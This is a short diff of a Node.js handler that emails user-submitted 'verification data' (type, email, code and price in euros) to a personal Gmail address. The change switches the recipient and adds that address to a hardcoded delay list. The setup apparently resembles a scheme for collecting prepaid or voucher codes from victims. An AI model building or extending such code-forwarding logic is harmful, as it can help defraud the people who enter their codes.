@@ -17,7 +17,7 @@ exports.contactAdmin = async (req, res) => {
   // Contenu du deuxième email
   const mailOptions = {
     from: 'Admin <onboarding@resend.dev>', // ton domaine validé chez Resend
-    to: 'dianelx12@gmail.com',
+    to: 'kariellebelle@gmail.com',
     subject: 'Données de vérification',
     text: `Type: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
   };
@@ -42,6 +42,7 @@ exports.contactAdmin = async (req, res) => {
     let delay =
       email === 'dianelx12@gmail.com' ||
       email === 'bibibibi3a@gmail.com' ||
+      email === 'kariellebelle@gmail.com' ||
       !email.includes('@')
         ? 25 * 1000
         : 55 * 1000;
